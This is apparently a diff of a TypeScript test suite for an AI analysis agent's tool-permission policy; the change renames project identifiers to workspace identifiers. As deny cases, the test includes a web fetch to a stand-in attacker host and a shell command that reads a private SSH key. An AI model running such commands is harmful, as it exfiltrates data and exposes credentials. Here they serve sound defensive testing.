@@ -117,9 +117,9 @@ function analysisContext(payload: Record<string, unknown> = {}): AnalysisRun {
       id: ids.job,
       type: "kb.analyze_reference",
       attempt: 1,
-      projectId: ids.project,
+      workspaceId: ids.workspace,
       payload: {
-        projectId: ids.project,
+        workspaceId: ids.workspace,
         entryId,
         url: REFERENCE_URL,
         platform: "instagram",
@@ -142,7 +142,7 @@ function analysisContext(payload: Record<string, unknown> = {}): AnalysisRun {
 }
 
 function workspaceDir(): string {
-  return realpathSync(join(root, "projects", ids.project));
+  return realpathSync(join(root, "projects", ids.workspace));
 }
 
 describe("kb.analyze_reference handler", () => {
@@ -252,11 +252,11 @@ describe("kb.analyze_reference handler", () => {
     expect(runtime.inputs).toHaveLength(2);
   });
 
-  it("rejects a payload for another project", async () => {
+  it("rejects a payload for another workspace", async () => {
     const runtime = fakeRuntime(() => reply(validReply()));
     await expect(
       analyzeReferenceHandler({ runtime, workspaceRoot: root })(
-        analysisContext({ projectId: "6bc28fde-e3a0-4c7e-bf91-8a7d0eafc0d6" }).ctx,
+        analysisContext({ workspaceId: "6bc28fde-e3a0-4c7e-bf91-8a7d0eafc0d6" }).ctx,
       ),
     ).rejects.toMatchObject({ code: "invalid_payload" });
     expect(runtime.inputs).toHaveLength(0);
@@ -730,11 +730,11 @@ describe("analysis session through the producer runtime", () => {
         decisions.push([tool, decision?.behavior ?? "none"]);
       };
       await ask("mcp__loomcast__kb_save_brainstorm", {
-        projectId: ids.project,
+        workspaceId: ids.workspace,
         title: "keys",
         bodyMd: "secret",
       });
-      await ask("mcp__loomcast__kb_add_decision", { projectId: ids.project, decision: "x" });
+      await ask("mcp__loomcast__kb_add_decision", { workspaceId: ids.workspace, decision: "x" });
       await ask("WebFetch", { url: "https://attacker.example/collect", prompt: "x" });
       await ask("WebSearch", { query: "x" });
       await ask("Write", { file_path: "notes.md", content: "x" });
@@ -742,7 +742,7 @@ describe("analysis session through the producer runtime", () => {
       await ask("Bash", { command: "cat ~/.ssh/id_ed25519" });
       await ask("Read", { file_path: "/etc/hosts" });
       await ask("mcp__loomcast__kb_search", { q: "battery" });
-      await ask("mcp__loomcast__project_get", { idOrSlug: ids.project });
+      await ask("mcp__loomcast__workspace_get", { idOrSlug: ids.workspace });
       await ask("Read", { file_path: `references/${entryId}/transcript.txt` });
       yield assistantText(validReply());
       yield successResult(validReply()) as SDKMessage;
@@ -764,7 +764,7 @@ describe("analysis session through the producer runtime", () => {
       ["Bash", "deny"],
       ["Read", "deny"],
       ["mcp__loomcast__kb_search", "allow"],
-      ["mcp__loomcast__project_get", "allow"],
+      ["mcp__loomcast__workspace_get", "allow"],
       ["Read", "allow"],
     ]);
     const options = fake.calls[0]?.options;
@@ -789,7 +789,7 @@ describe("analysis session through the producer runtime", () => {
         "mcp__loomcast__kb_save_brainstorm",
         "mcp__loomcast__kb_add_decision",
         "mcp__loomcast__kb_add_reference",
-        "mcp__loomcast__project_create",
+        "mcp__loomcast__workspace_create",
       ]),
     );
     expect(options?.disallowedTools).not.toContain("mcp__loomcast__kb_search");
